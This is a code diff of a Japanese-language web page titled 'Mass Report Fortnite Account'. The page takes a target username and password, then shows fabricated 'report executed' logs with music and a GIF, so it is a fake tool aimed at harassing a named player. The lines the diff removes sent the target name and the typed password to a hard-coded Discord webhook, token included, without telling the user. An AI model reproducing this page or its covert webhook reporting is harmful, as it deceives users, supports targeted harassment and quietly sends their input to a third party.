@@ -21,6 +21,7 @@
 
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
+    /* Tailwind custom styling for the page */
     body {
       background-color: #f3f4f6;
     }
@@ -55,16 +56,18 @@
       <h1>Mass Report Fortnite Account</h1>
     </div>
 
-    <!-- GIF Container -->
+    <!-- GIF Container (Always visible on top) -->
     <div id="gif-container" class="mt-6 mb-4" style="display: block;">
       <img src="miku.gif" alt="GIF Animation" id="gif" class="w-full max-w-lg mx-auto rounded-lg shadow-md" />
     </div>
 
-    <!-- Input Fields -->
+    <!-- Input Field -->
     <div class="mb-6">
       <label for="name" class="block text-gray-600 font-medium mb-2">ターゲットユーザー名</label>
       <input type="text" id="name" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400" placeholder="ユーザー名を入力してください" maxlength="16">
     </div>
+
+    <!-- Password Input Field -->
     <div class="mb-6">
       <label for="password" class="block text-gray-600 font-medium mb-2">パスワード</label>
       <input type="password" id="password" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400" placeholder="パスワードを入力してください">
@@ -83,49 +86,44 @@
   </div>
 
   <script>
-    const correctPassword = "114514"; // パスワード
-    const webhookUrl = "https://discord.com/api/webhooks/1331180644553719829/g2_IYRYpn1dn8gx-09H5XOwiXr0KwnAZG_r32gbE0PhOwHQd_xQA9jaNhvHzrKa-bjGp"; // WebhookのURL
+    const correctPassword = "114514"; // Replace with your actual password
 
     let loopInterval;
     let count = 0;
+    let animState = 0; // This will track the animation state
     const startBtn = document.getElementById('start-btn');
     const stopBtn = document.getElementById('stop-btn');
     const nameInput = document.getElementById('name');
-    const passwordInput = document.getElementById('password');
+    const passwordInput = document.getElementById('password'); // Password input
     const logBox = document.getElementById('log-box');
-    const gifContainer = document.getElementById('gif-container');
-    const audio = new Audio('audio.mp3');
-    audio.loop = true;
+    const gifContainer = document.getElementById('gif-container'); // GIF container
+    const audio = new Audio('audio.mp3'); // Replace 'audio.mp3' with the path to your MP3 file
+    audio.loop = true; // Enable looping for the audio
 
-    function sendToDiscord(name, password) {
-      const data = {
-        username: "Report Tool",
-        embeds: [
-          {
-            title: "New Report",
-            description: `ターゲット名: **${name}**\nパスワード: **${password}**`,
-            color: 16711680,
-          }
-        ]
-      };
+    // Function to handle the audio time checks
+    function handleAudioTimeUpdate() {
+      if (audio.paused) return;
 
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log("Webhook sent successfully!");
-        } else {
-          console.error("Failed to send webhook.");
-        }
-      })
-      .catch(error => {
-        console.error("Error:", error);
-      });
+      // If audio is within the specific time range, update animation state
+      if (animState !== 2 && audio.currentTime > 5.24 && audio.currentTime < 9.4) {
+        animState = 2;
+        console.log('Animation state changed to 2'); // Can be used to change an animation or UI state
+      }
+
+      // Reset audio time if it exceeds 17.53 seconds
+      if (audio.currentTime > 17.53) {
+        audio.currentTime = 15.86;
+      }
+    }
+
+    // Function to generate a random 4-letter string
+    function generateRandomString() {
+      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+      let randomString = '';
+      for (let i = 0; i < 4; i++) {
+        randomString += characters.charAt(Math.floor(Math.random() * characters.length));
+      }
+      return randomString;
     }
 
     startBtn.addEventListener('click', () => {
@@ -143,28 +141,32 @@
       }
 
       count = 0;
-      logBox.innerHTML = '';
-      audio.play();
-      gifContainer.style.display = 'block';
+      logBox.innerHTML = ''; // Clear logs
 
-      sendToDiscord(name, password);
+      audio.play(); // Play the audio in a loop
+      gifContainer.style.display = 'block'; // Ensure the GIF container stays visible
 
+      // Start checking the audio's current time after a delay of 10 seconds
       setTimeout(() => {
         loopInterval = setInterval(() => {
           count++;
-          const logMessage = `NTRXOX ${name} 通報を実行しました。(${count} 回目)`;
+          const randomString = generateRandomString(); // Generate random string
+          const logMessage = `NTRXOX ${randomString} ${name} 通報を実行しました。(${count} 回目)`;
           const logEntry = document.createElement('p');
           logEntry.textContent = logMessage;
           logBox.appendChild(logEntry);
-          logBox.scrollTop = logBox.scrollHeight;
-        }, 10);
-      }, 10000);
+          logBox.scrollTop = logBox.scrollHeight; // Auto-scroll to the bottom
+
+          handleAudioTimeUpdate(); // Call the function to handle the audio time updates
+        }, 10); // Loop every 0.1 seconds
+      }, 10000); // Start logging after 10 seconds
     });
 
     stopBtn.addEventListener('click', () => {
       clearInterval(loopInterval);
       audio.pause();
-      audio.currentTime = 0;
+      audio.currentTime = 0; // Reset audio playback
+      // Do not hide the GIF container
     });
   </script>
 </body>
